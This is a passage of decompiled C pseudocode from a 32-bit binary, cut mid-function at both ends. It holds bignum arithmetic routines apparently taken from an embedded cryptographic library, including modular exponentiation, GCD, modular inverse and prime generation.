          v11 = sub_405EF0((int)&v31[3], (int)&v39, a4, v9, (int)&v41);
          if ( !v11 )
          {
            v11 = sub_4031E0((int)a1, (int)&v39);
            if ( !v11 )
            {
              v11 = sub_406010((int)a1, a4, v9, (int)&v41);
              if ( !v11 )
              {
                v15 = v47;
                if ( v47 > 1 )
                {
                  j = v47 - 1;
                  v49 = 1 << (v47 - 1);
                  v16 = *(_DWORD *)(a4 + 4) + 1;
                  Count = (size_t)&v31[3 * v49];
                  v11 = sub_4046F0(Count, v16);
                  if ( v11 )
                    goto LABEL_73;
                  v11 = sub_4031E0(Count, (int)&v31[3]);
                  if ( v11 )
                    goto LABEL_73;
                  for ( i = 0; i < j; ++i )
                  {
                    v11 = sub_405EF0(Count, Count, a4, v9, (int)&v41);
                    if ( v11 )
                      goto LABEL_73;
                  }
                  v15 = v47;
                  v17 = v49 + 1;
                  Count = v17;
                  v49 = 1 << v47;
                  if ( v17 < 1 << v47 )
                  {
                    v18 = &v31[3 * v17];
                    v46 = (int)v18;
                    do
                    {
                      v11 = sub_4046F0((int)v18, *(_DWORD *)(a4 + 4) + 1);
                      if ( v11 )
                        goto LABEL_73;
                      v11 = sub_4031E0(v46, v46 - 12);
                      if ( v11 )
                        goto LABEL_73;
                      v11 = sub_405EF0(v46, (int)&v31[3], a4, v9, (int)&v41);
                      if ( v11 )
                        goto LABEL_73;
                      v18 = (int *)(v46 + 12);
                      ++Count;
                      v46 += 12;
                    }
                    while ( Count < v49 );
                    v15 = v47;
                  }
                }
                v11 = 0;
                v49 = 0;
                i = *(_DWORD *)(a3 + 4);
                Count = 0;
LABEL_48:
                v46 = 0;
                for ( j = 0; ; v11 = j )
                {
                  do
                  {
                    while ( 1 )
                    {
                      v19 = v49;
                      if ( !v49 )
                      {
                        if ( !i )
                        {
                          v49 = 0;
                          if ( v11 )
                          {
                            while ( 1 )
                            {
                              v11 = sub_405EF0((int)a1, (int)a1, (int)v5, v9, (int)&v41);
                              if ( v11 )
                                break;
                              v46 *= 2;
                              if ( ((1 << v47) & v46) != 0 )
                              {
                                v11 = sub_405EF0((int)a1, (int)&v31[3], (int)v5, v9, (int)&v41);
                                if ( v11 )
                                  break;
                              }
                              if ( ++v49 >= j )
                                goto LABEL_68;
                            }
                          }
                          else
                          {
LABEL_68:
                            v49 = 1;
                            v38 = &v49;
                            v36 = 1;
                            v37 = 1;
                            v11 = sub_405EF0((int)a1, (int)&v36, (int)v5, v9, (int)&v41);
                            if ( !v11 && v32 == -1 && *(_DWORD *)(a3 + 4) && (**(_BYTE **)(a3 + 8) & 1) != 0 )
                            {
                              *a1 = -1;
                              v11 = sub_402F50(a1, v5, a1);
                            }
                          }
                          goto LABEL_73;
                        }
                        v19 = 32;
                        --i;
                      }
                      v49 = v19 - 1;
                      v5 = (int *)a4;
                      v20 = (*(_DWORD *)(*(_DWORD *)(a3 + 8) + 4 * i) >> (v19 - 1)) & 1;
                      if ( !v20 )
                        break;
LABEL_57:
                      ++v11;
                      Count = 2;
                      j = v11;
                      v46 |= v20 << (v15 - v11);
                      if ( v11 == v15 )
                      {
                        v21 = 0;
                        while ( 1 )
                        {
                          v11 = sub_405EF0((int)a1, (int)a1, a4, v9, (int)&v41);
                          if ( v11 )
                            goto LABEL_73;
                          if ( ++v21 >= v47 )
                          {
                            v5 = (int *)a4;
                            v11 = sub_405EF0((int)a1, (int)&v31[3 * v46], a4, v9, (int)&v41);
                            if ( v11 )
                              goto LABEL_73;
                            v15 = v47;
                            Count = 1;
                            goto LABEL_48;
                          }
                        }
                      }
                    }
                  }
                  while ( !Count );
                  if ( Count != 1 )
                    goto LABEL_57;
                  v11 = sub_405EF0((int)a1, (int)a1, a4, v9, (int)&v41);
                  if ( v11 )
                    break;
                  v15 = v47;
                }
              }
            }
          }
        }
      }
    }
  }
LABEL_73:
  v22 = 1 << (v47 - 1);
  if ( v22 < 1 << v47 )
  {
    v23 = (1 << v47) - v22;
    v49 = v23;
    v24 = (void **)&v31[3 * v22 + 2];
    do
    {
      if ( v24 != (void **)8 )
      {
        v25 = *v24;
        if ( *v24 )
        {
          sub_408020(v25, 4 * (_DWORD)*(v24 - 1));
          free(v25);
          v23 = v49;
        }
        *(v24 - 2) = (void *)1;
        *(v24 - 1) = 0;
        *v24 = 0;
      }
      v24 += 3;
      v49 = --v23;
    }
    while ( v23 );
  }
  v26 = (void *)v31[5];
  if ( v31[5] )
  {
    sub_408020((void *)v31[5], 4 * v31[4]);
    free(v26);
  }
  v27 = v43;
  if ( v43 )
  {
    sub_408020(v43, 4 * v42);
    free(v27);
  }
  v28 = v35;
  if ( v35 )
  {
    sub_408020(v35, 4 * v34);
    free(v28);
  }
  if ( !a5 || !*(_DWORD *)(a5 + 8) )
  {
    v29 = v40;
    if ( v40 )
    {
      sub_408020(v40, 4 * HIDWORD(v39));
      free(v29);
    }
  }
  return v11;
}

//----- (00403F50) --------------------------------------------------------
int __cdecl sub_403F50(int a1, unsigned int a2, void (__cdecl *a3)(int, unsigned int, unsigned int), int a4)
{
  unsigned int v4; // ebx
  int v5; // eax
  void *v6; // ecx
  void *v8; // edi
  const void *v9; // ecx
  int v10; // edi

  v4 = (a2 >> 2) + ((a2 & 3) != 0);
  v5 = *(_DWORD *)(a1 + 4);
  if ( v5 != v4 )
  {
    v6 = *(void **)(a1 + 8);
    if ( v6 )
    {
      sub_408020(v6, 4 * v5);
      free(*(void **)(a1 + 8));
    }
    *(_DWORD *)a1 = 1;
    *(_DWORD *)(a1 + 4) = 0;
    *(_DWORD *)(a1 + 8) = 0;
    if ( v4 > 0x2710 )
      return -16;
    if ( v4 )
    {
      v8 = calloc(v4, 4u);
      if ( !v8 )
        return -16;
      v9 = *(const void **)(a1 + 8);
      if ( v9 )
      {
        memcpy(v8, v9, 4 * *(_DWORD *)(a1 + 4));
        sub_408020(*(void **)(a1 + 8), 4 * *(_DWORD *)(a1 + 4));
        free(*(void **)(a1 + 8));
      }
      *(_DWORD *)(a1 + 4) = v4;
      *(_DWORD *)(a1 + 8) = v8;
    }
  }
  v10 = sub_404E70(a1, 0);
  if ( !v10 )
  {
    a3(a4, 4 * v4 - a2 + *(_DWORD *)(a1 + 8), a2);
    sub_405920(*(unsigned int **)(a1 + 8), v4);
  }
  return v10;
}

//----- (00404050) --------------------------------------------------------
void __cdecl sub_404050(int a1)
{
  void *v1; // ecx

  if ( a1 )
  {
    v1 = *(void **)(a1 + 8);
    if ( v1 )
    {
      sub_408020(v1, 4 * *(_DWORD *)(a1 + 4));
      free(*(void **)(a1 + 8));
    }
    *(_DWORD *)a1 = 1;
    *(_DWORD *)(a1 + 4) = 0;
    *(_DWORD *)(a1 + 8) = 0;
  }
}

//----- (004040A0) --------------------------------------------------------
int __cdecl sub_4040A0(int a1, int a2, int a3)
{
  void *v3; // edi
  int v4; // esi
  unsigned int v5; // esi
  unsigned int v6; // ebx
  unsigned int v7; // edx
  int v8; // esi
  unsigned int v9; // ecx
  unsigned int v10; // edx
  unsigned int v11; // ecx
  int *v12; // eax
  void *v13; // ebx
  int v15; // [esp+Ch] [ebp-2Ch] BYREF
  int v16; // [esp+10h] [ebp-28h]
  int *v17; // [esp+14h] [ebp-24h]
  int v18; // [esp+18h] [ebp-20h] BYREF
  unsigned int v19; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v21; // [esp+24h] [ebp-14h] BYREF
  unsigned int v22; // [esp+28h] [ebp-10h]
  _DWORD *v23; // [esp+2Ch] [ebp-Ch]
  unsigned int v24; // [esp+30h] [ebp-8h]
  int v25; // [esp+34h] [ebp-4h] BYREF

  v18 = 1;
  v3 = 0;
  v19 = 0;
  Block = 0;
  v21 = 1;
  v22 = 0;
  v23 = 0;
  v4 = sub_4031E0((int)&v18, a2);
  if ( !v4 )
  {
    v4 = sub_4031E0((int)&v21, a3);
    if ( !v4 )
    {
      v5 = sub_404E20((int)&v18);
      v6 = sub_404E20((int)&v21);
      if ( v6 >= v5 )
        v6 = v5;
      v24 = v6;
      v4 = sub_4055B0((int)&v18, v6);
      if ( !v4 )
      {
        v4 = sub_4055B0((int)&v21, v6);
        if ( !v4 )
        {
          v21 = 1;
          v17 = &v25;
          v18 = 1;
          v25 = 0;
          v15 = 1;
          v16 = 1;
          if ( sub_403100(&v18, &v15) )
          {
            while ( 1 )
            {
              v7 = 0;
              v8 = 0;
              if ( v19 )
              {
LABEL_9:
                v9 = 0;
                while ( ((*((_DWORD *)Block + v8) >> v9) & 1) == 0 )
                {
                  ++v9;
                  ++v7;
                  if ( v9 >= 0x20 )
                  {
                    if ( ++v8 < v19 )
                      goto LABEL_9;
                    goto LABEL_13;
                  }
                }
              }
              else
              {
LABEL_13:
                v7 = 0;
              }
              v4 = sub_4055B0((int)&v18, v7);
              if ( v4 )
                break;
              v10 = 0;
              if ( v22 )
              {
LABEL_16:
                v11 = 0;
                while ( ((v23[v4] >> v11) & 1) == 0 )
                {
                  ++v11;
                  ++v10;
                  if ( v11 >= 0x20 )
                  {
                    if ( ++v4 < v22 )
                      goto LABEL_16;
                    goto LABEL_20;
                  }
                }
              }
              else
              {
LABEL_20:
                v10 = 0;
              }
              v4 = sub_4055B0((int)&v21, v10);
              if ( v4 )
                break;
              if ( sub_403100(&v18, &v21) < 0 )
              {
                v4 = sub_4056C0((int)&v21, (int)&v21, (int)&v18);
                if ( v4 )
                  break;
                v12 = &v21;
              }
              else
              {
                v4 = sub_4056C0((int)&v18, (int)&v18, (int)&v21);
                if ( v4 )
                  break;
                v12 = &v18;
              }
              v4 = sub_4055B0((int)v12, 1u);
              if ( v4 )
                break;
              v15 = 1;
              v17 = &v25;
              v16 = 1;
              if ( !sub_403100(&v18, &v15) )
              {
                v6 = v24;
                goto LABEL_30;
              }
            }
          }
          else
          {
LABEL_30:
            v4 = sub_405470((int)&v21, v6);
            if ( !v4 )
              v4 = sub_4031E0(a1, (int)&v21);
          }
        }
      }
    }
    v3 = v23;
  }
  v13 = Block;
  if ( Block )
  {
    sub_408020(Block, 4 * v19);
    free(v13);
  }
  if ( v3 )
  {
    sub_408020(v3, 4 * v22);
    free(v3);
  }
  return v4;
}

//----- (00404310) --------------------------------------------------------
int __cdecl sub_404310(int a1, unsigned int a2, char a3, void (__cdecl *a4)(int, unsigned int, unsigned int), int a5)
{
  int v5; // edx
  unsigned int v6; // ebx
  int *v7; // edi
  int i; // esi
  int result; // eax
  unsigned int v10; // esi
  unsigned int v11; // edi
  unsigned int *v12; // ebx
  unsigned int v13; // ecx
  void *v14; // edi
  int v15[3]; // [esp+0h] [ebp-30h] BYREF
  int v16; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+10h] [ebp-20h]
  unsigned int *v18; // [esp+14h] [ebp-1Ch]
  int v19; // [esp+18h] [ebp-18h] BYREF
  int v20; // [esp+1Ch] [ebp-14h]
  void *Block; // [esp+20h] [ebp-10h]
  int v22; // [esp+24h] [ebp-Ch]
  unsigned int v23; // [esp+28h] [ebp-8h]
  unsigned int v24; // [esp+2Ch] [ebp-4h]

  if ( a2 - 3 > 0x1FFD )
    return -4;
  v19 = 1;
  v20 = 0;
  Block = 0;
  v5 = (a2 >> 5) + ((a2 & 0x1F) != 0);
  v22 = v5;
  if ( (a3 & 2) != 0 )
  {
    if ( a2 < 0x5AA )
    {
      if ( a2 < 0x47E )
      {
        if ( a2 < 0x3E8 )
        {
          if ( a2 < 0x352 )
          {
            if ( a2 < 0x2EE )
            {
              if ( a2 < 0x1F4 )
              {
                if ( a2 < 0xFA )
                  v6 = a2 < 0x96 ? 51 : 40;
                else
                  v6 = 28;
              }
              else
              {
                v6 = 13;
              }
            }
            else
            {
              v6 = 8;
            }
          }
          else
          {
            v6 = 7;
          }
        }
        else
        {
          v6 = 6;
        }
      }
      else
      {
        v6 = 5;
      }
    }
    else
    {
      v6 = 4;
    }
  }
  else if ( a2 < 0x514 )
  {
    if ( a2 < 0x352 )
    {
      if ( a2 < 0x28A )
      {
        if ( a2 < 0x15E )
        {
          if ( a2 < 0xFA )
            v6 = a2 < 0x96 ? 27 : 18;
          else
            v6 = 12;
        }
        else
        {
          v6 = 8;
        }
      }
      else
      {
        v6 = 4;
      }
    }
    else
    {
      v6 = 3;
    }
  }
  else
  {
    v6 = 2;
  }
  v7 = (int *)a1;
  v24 = v6;
  v23 = 4 * v5;
  i = sub_403F50(a1, 4 * v5, a4, a5);
  if ( i )
    return i;
  while ( *(_DWORD *)(*(_DWORD *)(a1 + 8) + v23 - 4) < 0xB504F334 )
  {
LABEL_35:
    result = sub_403F50(a1, v23, a4, a5);
    if ( result )
      return result;
  }
  if ( 32 * v22 > a2 )
  {
    i = sub_4055B0(a1, 32 * v22 - a2);
    if ( i )
      return i;
  }
  **(_DWORD **)(a1 + 8) |= 1u;
  if ( (a3 & 1) == 0 )
  {
    i = sub_404D30(a1, v6, a4, a5);
    if ( i != -14 )
      return i;
    goto LABEL_35;
  }
  v10 = 0;
  **(_DWORD **)(a1 + 8) |= 2u;
  a2 = *(_DWORD *)(a1 + 4);
  if ( a2 )
  {
    v11 = a2;
    v12 = (unsigned int *)(*(_DWORD *)(a1 + 8) + 4 * (a2 - 1));
    do
    {
      v13 = *v12--;
      v10 = ((unsigned __int16)v13 | (((HIWORD(v13) | (v10 << 16)) % 3) << 16)) % 3;
      --v11;
    }
    while ( v11 );
    v7 = (int *)a1;
    v6 = v24;
  }
  if ( *v7 >= 0 )
  {
LABEL_44:
    if ( !v10 )
      goto LABEL_45;
    if ( v10 == 1 )
    {
      a2 = 4;
      goto LABEL_48;
    }
LABEL_49:
    i = sub_4031E0((int)&v19, (int)v7);
    if ( !i )
    {
      for ( i = sub_4055B0((int)&v19, 1u); !i; i = sub_402F50(&v19, &v19, v15) )
      {
        i = sub_4059C0((unsigned int)v7);
        if ( !i )
        {
          i = sub_4059C0((unsigned int)&v19);
          if ( !i )
          {
            i = sub_405A60(v7, v6, a4, a5);
            if ( !i )
            {
              i = sub_405A60(&v19, v6, a4, a5);
              if ( !i )
                break;
            }
          }
        }
        if ( i != -14 )
          break;
        a2 = 12;
        v18 = &a2;
        v16 = 1;
        v17 = 1;
        i = sub_402F50(v7, v7, &v16);
        if ( i )
          break;
        a2 = 6;
        v15[2] = (int)&a2;
        v15[0] = 1;
        v15[1] = 1;
      }
    }
    v14 = Block;
    if ( Block )
    {
      sub_408020(Block, 4 * v20);
      free(v14);
    }
  }
  else
  {
    if ( v10 )
    {
      v10 = 3 - v10;
      goto LABEL_44;
    }
LABEL_45:
    a2 = 8;
LABEL_48:
    v16 = 1;
    v18 = &a2;
    v17 = 1;
    i = sub_402F50(v7, v7, &v16);
    if ( !i )
      goto LABEL_49;
  }
  return i;
}

//----- (004046C0) --------------------------------------------------------
int __cdecl sub_4046C0(int a1, unsigned int a2)
{
  if ( 32 * *(_DWORD *)(a1 + 4) > a2 )
    return (*(_DWORD *)(*(_DWORD *)(a1 + 8) + 4 * (a2 >> 5)) >> (a2 & 0x1F)) & 1;
  else
    return 0;
}

//----- (004046F0) --------------------------------------------------------
int __cdecl sub_4046F0(int a1, size_t Count)
{
  void *v2; // ebx
  const void *v3; // eax

  if ( Count <= 0x2710 )
  {
    if ( *(_DWORD *)(a1 + 4) >= Count )
      return 0;
    v2 = calloc(Count, 4u);
    if ( v2 )
    {
      v3 = *(const void **)(a1 + 8);
      if ( v3 )
      {
        memcpy(v2, v3, 4 * *(_DWORD *)(a1 + 4));
        sub_408020(*(void **)(a1 + 8), 4 * *(_DWORD *)(a1 + 4));
        free(*(void **)(a1 + 8));
      }
      *(_DWORD *)(a1 + 4) = Count;
      *(_DWORD *)(a1 + 8) = v2;
      return 0;
    }
  }
  return -16;
}

//----- (00404760) --------------------------------------------------------
_DWORD *__cdecl sub_404760(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 1;
  a1[1] = 0;
  a1[2] = 0;
  return result;
}

//----- (00404780) --------------------------------------------------------
int __cdecl sub_404780(int a1, int *a2, int *a3)
{
  int v4; // esi
  int v5; // eax
  void *v6; // edi
  void *v7; // edi
  void *v8; // edi
  void *v9; // edi
  void *v10; // edi
  void *v11; // edi
  void *v12; // edi
  void *v13; // edi
  void *v14; // edi
  int v15; // [esp+4h] [ebp-7Ch] BYREF
  int v16; // [esp+8h] [ebp-78h]
  int *v17; // [esp+Ch] [ebp-74h]
  int v18; // [esp+10h] [ebp-70h] BYREF
  int v19; // [esp+14h] [ebp-6Ch]
  void *v20; // [esp+18h] [ebp-68h]
  int v21; // [esp+1Ch] [ebp-64h] BYREF
  int v22; // [esp+20h] [ebp-60h]
  void *v23; // [esp+24h] [ebp-5Ch]
  int v24; // [esp+28h] [ebp-58h] BYREF
  int v25; // [esp+2Ch] [ebp-54h]
  void *Block; // [esp+30h] [ebp-50h]
  int v27; // [esp+34h] [ebp-4Ch] BYREF
  int v28; // [esp+38h] [ebp-48h]
  void *v29; // [esp+3Ch] [ebp-44h]
  int v30; // [esp+40h] [ebp-40h] BYREF
  int v31; // [esp+44h] [ebp-3Ch]
  void *v32; // [esp+48h] [ebp-38h]
  int v33; // [esp+4Ch] [ebp-34h] BYREF
  int v34; // [esp+50h] [ebp-30h]
  void *v35; // [esp+54h] [ebp-2Ch]
  int v36; // [esp+58h] [ebp-28h] BYREF
  int v37; // [esp+5Ch] [ebp-24h]
  void *v38; // [esp+60h] [ebp-20h]
  int v39; // [esp+64h] [ebp-1Ch] BYREF
  int v40; // [esp+68h] [ebp-18h]
  void *v41; // [esp+6Ch] [ebp-14h]
  int v42; // [esp+70h] [ebp-10h] BYREF
  int v43; // [esp+74h] [ebp-Ch]
  void *v44; // [esp+78h] [ebp-8h]
  int v45; // [esp+7Ch] [ebp-4h] BYREF

  v45 = 1;
  v17 = &v45;
  v15 = 1;
  v16 = 1;
  if ( sub_403100(a3, &v15) <= 0 )
    return -4;
  v24 = 1;
  v25 = 0;
  Block = 0;
  v39 = 1;
  v40 = 0;
  v41 = 0;
  v36 = 1;
  v37 = 0;
  v38 = 0;
  v33 = 1;
  v34 = 0;
  v35 = 0;
  v18 = 1;
  v19 = 0;
  v20 = 0;
  v21 = 1;
  v22 = 0;
  v23 = 0;
  v30 = 1;
  v31 = 0;
  v32 = 0;
  v42 = 1;
  v43 = 0;
  v44 = 0;
  v27 = 1;
  v28 = 0;
  v29 = 0;
  v4 = sub_4040A0((int)&v18, (int)a2, (int)a3);
  if ( !v4 )
  {
    v45 = 1;
    v17 = &v45;
    v15 = 1;
    v16 = 1;
    if ( sub_403100(&v18, &v15) )
    {
      v4 = -14;
    }
    else
    {
      v4 = sub_404FB0(&v24, a2, a3);
      if ( !v4 )
      {
        v4 = sub_4031E0((int)&v39, (int)&v24);
        if ( !v4 )
        {
          v4 = sub_4031E0((int)&v21, (int)a3);
          if ( !v4 )
          {
            v4 = sub_4031E0((int)&v30, (int)a3);
            if ( !v4 )
            {
              v4 = sub_404E70((int)&v36, 1);
              if ( !v4 )
              {
                v4 = sub_404E70((int)&v33, 0);
                if ( !v4 )
                {
                  v4 = sub_404E70((int)&v42, 0);
                  if ( !v4 )
                  {
                    v4 = sub_404E70((int)&v27, 1);
                    if ( !v4 )
                    {
                      while ( (*(_BYTE *)v41 & 1) != 0 )
                      {
LABEL_23:
                        while ( (*(_BYTE *)v32 & 1) == 0 )
                        {
                          v4 = sub_4055B0((int)&v30, 1u);
                          if ( v4 )
                            goto LABEL_48;
                          if ( (*(_BYTE *)v44 & 1) != 0 || (*(_BYTE *)v29 & 1) != 0 )
                          {
                            v4 = sub_402F50(&v42, &v42, &v21);
                            if ( v4 )
                              goto LABEL_48;
                            v4 = sub_4057D0(&v27, &v27, &v24);
                            if ( v4 )
                              goto LABEL_48;
                          }
                          v4 = sub_4055B0((int)&v42, 1u);
                          if ( v4 )
                            goto LABEL_48;
                          v4 = sub_4055B0((int)&v27, 1u);
                          if ( v4 )
                            goto LABEL_48;
                        }
                        if ( sub_403100(&v39, &v30) < 0 )
                        {
                          v4 = sub_4057D0(&v30, &v30, &v39);
                          if ( v4 )
                            goto LABEL_48;
                          v4 = sub_4057D0(&v42, &v42, &v36);
                          if ( v4 )
                            goto LABEL_48;
                          v5 = sub_4057D0(&v27, &v27, &v33);
                        }
                        else
                        {
                          v4 = sub_4057D0(&v39, &v39, &v30);
                          if ( v4 )
                            goto LABEL_48;
                          v4 = sub_4057D0(&v36, &v36, &v42);
                          if ( v4 )
                            goto LABEL_48;
                          v5 = sub_4057D0(&v33, &v33, &v27);
                        }
                        v4 = v5;
                        if ( v5 )
                          goto LABEL_48;
                        if ( !sub_4030C0(&v39, 0) )
                        {
                          if ( sub_4030C0(&v42, 0) >= 0 )
                          {
LABEL_44:
                            if ( sub_403100(&v42, a3) < 0 )
                            {
LABEL_47:
                              v4 = sub_4031E0(a1, (int)&v42);
                            }
                            else
                            {
                              while ( 1 )
                              {
                                v4 = sub_4057D0(&v42, &v42, a3);
                                if ( v4 )
                                  break;
                                if ( sub_403100(&v42, a3) < 0 )
                                  goto LABEL_47;
                              }
                            }
                          }
                          else
                          {
                            while ( 1 )
                            {
                              v4 = sub_402F50(&v42, &v42, a3);
                              if ( v4 )
                                break;
                              if ( sub_4030C0(&v42, 0) >= 0 )
                                goto LABEL_44;
                            }
                          }
                          goto LABEL_48;
                        }
                      }
                      while ( 1 )
                      {
                        v4 = sub_4055B0((int)&v39, 1u);
                        if ( v4 )
                          break;
                        if ( (*(_BYTE *)v38 & 1) != 0 || (*(_BYTE *)v35 & 1) != 0 )
                        {
                          v4 = sub_402F50(&v36, &v36, &v21);
                          if ( v4 )
                            break;
                          v4 = sub_4057D0(&v33, &v33, &v24);
                          if ( v4 )
                            break;
                        }
                        v4 = sub_4055B0((int)&v36, 1u);
                        if ( v4 )
                          break;
                        v4 = sub_4055B0((int)&v33, 1u);
                        if ( v4 )
                          break;
                        if ( (*(_BYTE *)v41 & 1) != 0 )
                          goto LABEL_23;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
LABEL_48:
      v6 = Block;
      if ( Block )
      {
        sub_408020(Block, 4 * v25);
        free(v6);
      }
      v7 = v41;
      if ( v41 )
      {
        sub_408020(v41, 4 * v40);
        free(v7);
      }
      v8 = v38;
      if ( v38 )
      {
        sub_408020(v38, 4 * v37);
        free(v8);
      }
      v9 = v35;
      if ( v35 )
      {
        sub_408020(v35, 4 * v34);
        free(v9);
      }
    }
  }
  v10 = v20;
  if ( v20 )
  {
    sub_408020(v20, 4 * v19);
    free(v10);
  }
  v11 = v23;
  if ( v23 )
  {
    sub_408020(v23, 4 * v22);
    free(v11);
  }
  v12 = v32;
  if ( v32 )
  {
    sub_408020(v32, 4 * v31);
    free(v12);
  }
  v13 = v44;
  if ( v44 )
  {
    sub_408020(v44, 4 * v43);
    free(v13);
  }
  v14 = v29;
  if ( v29 )
  {
    sub_408020(v29, 4 * v28);
    free(v14);
  }
  return v4;
}

//----- (00404D30) --------------------------------------------------------
int __cdecl sub_404D30(int a1, unsigned int a2, void (__cdecl *a3)(int, unsigned int, unsigned int), int a4)
{
  int v4; // ecx
  int result; // eax
  int v6; // [esp+0h] [ebp-18h] BYREF
  int v7; // [esp+4h] [ebp-14h]
  int *v8; // [esp+8h] [ebp-10h]
  int v9[3]; // [esp+Ch] [ebp-Ch] BYREF

  v4 = a1;
  v9[0] = 1;
  a1 = 0;
  v6 = 1;
  v9[1] = *(_DWORD *)(v4 + 4);
  v9[2] = *(_DWORD *)(v4 + 8);
  v8 = &a1;
  v7 = 1;
  if ( !sub_403100(v9, &v6) )
    return -14;
  a1 = 1;
  v8 = &a1;
  v6 = 1;
  v7 = 1;
  if ( !sub_403100(v9, &v6) )
    return -14;
  a1 = 2;
  v8 = &a1;
  v6 = 1;
  v7 = 1;
  if ( !sub_403100(v9, &v6) )
    return 0;
  result = sub_4059C0((unsigned int)v9);
  if ( result )
  {
    if ( result != 1 )
      return result;
    return 0;
  }
  return sub_405A60(v9, a2, a3, a4);
}

//----- (00404E20) --------------------------------------------------------
int __cdecl sub_404E20(int a1)
{
  int v2; // edx
  unsigned int v3; // edi
  _DWORD *v4; // ebx
  unsigned int i; // ecx
  unsigned int v7; // [esp+14h] [ebp+8h]

  v2 = 0;
  v3 = 0;
  v7 = *(_DWORD *)(a1 + 4);
  if ( v7 )
  {
    v4 = *(_DWORD **)(a1 + 8);
    while ( 2 )
    {
      for ( i = 0; i < 0x20; ++i )
      {
        if ( ((*v4 >> i) & 1) != 0 )
          return v2;
        ++v2;
      }
      ++v3;
      ++v4;
      if ( v3 < v7 )
        continue;
      break;
    }
  }
  return 0;
}

//----- (00404E70) --------------------------------------------------------
int __cdecl sub_404E70(int a1, int a2)
{
  int v2; // eax
  void *v3; // esi
  const void *v5; // ecx

  v2 = *(_DWORD *)(a1 + 4);
  if ( !v2 )
  {
    v3 = calloc(1u, 4u);
    if ( !v3 )
      return -16;
    v5 = *(const void **)(a1 + 8);
    if ( v5 )
    {
      memcpy(v3, v5, 4 * *(_DWORD *)(a1 + 4));
      sub_408020(*(void **)(a1 + 8), 4 * *(_DWORD *)(a1 + 4));
      free(*(void **)(a1 + 8));
    }
    *(_DWORD *)(a1 + 4) = 1;
    v2 = 1;
    *(_DWORD *)(a1 + 8) = v3;
  }
  memset(*(void **)(a1 + 8), 0, 4 * v2);
  **(_DWORD **)(a1 + 8) = abs32(a2);
  *(_DWORD *)a1 = ((a2 >> 31) & 0xFFFFFFFE) + 1;
  return 0;
}

//----- (00404F10) --------------------------------------------------------
int __cdecl sub_404F10(_DWORD *a1, int a2, int a3)
{
  int *v4; // eax
  int v5; // edi
  unsigned int v6; // edx
  unsigned int *v7; // ebx
  unsigned int v8; // ecx

  if ( !a3 )
    return -12;
  if ( a3 < 0 )
    return -10;
  if ( a3 == 1 )
  {
    *a1 = 0;
    return 0;
  }
  else
  {
    v4 = (int *)a2;
    if ( a3 == 2 )
    {
      *a1 = **(_DWORD **)(a2 + 8) & 1;
      return 0;
    }
    else
    {
      v5 = *(_DWORD *)(a2 + 4);
      v6 = 0;
      if ( v5 )
      {
        v7 = (unsigned int *)(*(_DWORD *)(a2 + 8) + 4 * (v5 - 1));
        do
        {
          v8 = *v7--;
          v6 = (((((v6 << 16) | HIWORD(v8)) % a3) << 16) | (unsigned __int16)v8) % a3;
          --v5;
        }
        while ( v5 );
        v4 = (int *)a2;
      }
      if ( *v4 < 0 )
      {
        if ( v6 )
          v6 = a3 - v6;
      }
      *a1 = v6;
      return 0;
    }
  }
}

//----- (00404FB0) --------------------------------------------------------
int __cdecl sub_404FB0(int *a1, int *a2, int *a3)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // [esp+4h] [ebp-10h] BYREF
  int v12; // [esp+8h] [ebp-Ch]
  int *v13; // [esp+Ch] [ebp-8h]
  int v14; // [esp+10h] [ebp-4h] BYREF

  v14 = 0;
  v13 = &v14;
  v11 = 1;
  v12 = 1;
  if ( sub_403100(a3, &v11) < 0 )
    return -10;
  v4 = sub_4032C0(0, a1, a2, a3);
  if ( !v4 )
  {
    v14 = 0;
    v13 = &v14;
    v11 = 1;
    v12 = 1;
    if ( sub_403100(a1, &v11) < 0 )
    {
      while ( 1 )
      {
        v5 = *a1 * *a3;
        v14 = *a1;
        if ( v5 >= 0 )
          break;
        if ( (sub_403020((int)a1, (int)a3) & 0x80000000) == 0 )
        {
          v6 = sub_4056C0((int)a1, (int)a1, (int)a3);
LABEL_11:
          v4 = v6;
          if ( v6 )
            return v4;
          v7 = v14;
          goto LABEL_13;
        }
        v4 = sub_4056C0((int)a1, (int)a3, (int)a1);
        if ( v4 )
          return v4;
        v7 = -v14;
LABEL_13:
        *a1 = v7;
        v14 = 0;
        v13 = &v14;
        v11 = 1;
        v12 = 1;
        if ( sub_403100(a1, &v11) >= 0 )
          goto LABEL_14;
      }
      v6 = sub_402D40((int)a1, (int)a1, (int)a3);
      goto LABEL_11;
    }
LABEL_14:
    if ( sub_403100(a1, a3) >= 0 )
    {
      while ( 1 )
      {
        v8 = *a1 * *a3;
        v14 = *a1;
        if ( v8 <= 0 )
          break;
        if ( (sub_403020((int)a1, (int)a3) & 0x80000000) == 0 )
        {
          v9 = sub_4056C0((int)a1, (int)a1, (int)a3);
LABEL_21:
          v4 = v9;
          if ( v9 )
            return v4;
          v10 = v14;
          goto LABEL_23;
        }
        v4 = sub_4056C0((int)a1, (int)a3, (int)a1);
        if ( v4 )
          return v4;
        v10 = -v14;
LABEL_23:
        *a1 = v10;
        if ( sub_403100(a1, a3) < 0 )
          return v4;
      }
      v9 = sub_402D40((int)a1, (int)a1, (int)a3);
      goto LABEL_21;
    }
  }
  return v4;
}

//----- (00405150) --------------------------------------------------------
int __cdecl sub_405150(int *a1, int *a2, int a3)
{
  int v4[3]; // [esp+0h] [ebp-10h] BYREF
  int v5; // [esp+Ch] [ebp-4h] BYREF

  v4[0] = 1;
  v4[2] = (int)&v5;
  v5 = a3;
  v4[1] = 1;
  return sub_405190(a1, a2, v4);
}

//----- (00405190) --------------------------------------------------------
int __cdecl sub_405190(int *a1, int *a2, int *a3)
{
  int v3; // ebx
  int *v4; // esi
  int v5; // ebx
  int *v6; // ecx
  unsigned int v7; // edi
  _DWORD *v8; // eax
  int v9; // esi
  _DWORD *v10; // eax
  void *v11; // ecx
  const void *v12; // edx
  void *v13; // esi
  void *v14; // esi
  int v16; // [esp+8h] [ebp-1Ch] BYREF
  int v17; // [esp+Ch] [ebp-18h]
  void *v18; // [esp+10h] [ebp-14h]
  int v19; // [esp+14h] [ebp-10h] BYREF
  int v20; // [esp+18h] [ebp-Ch]
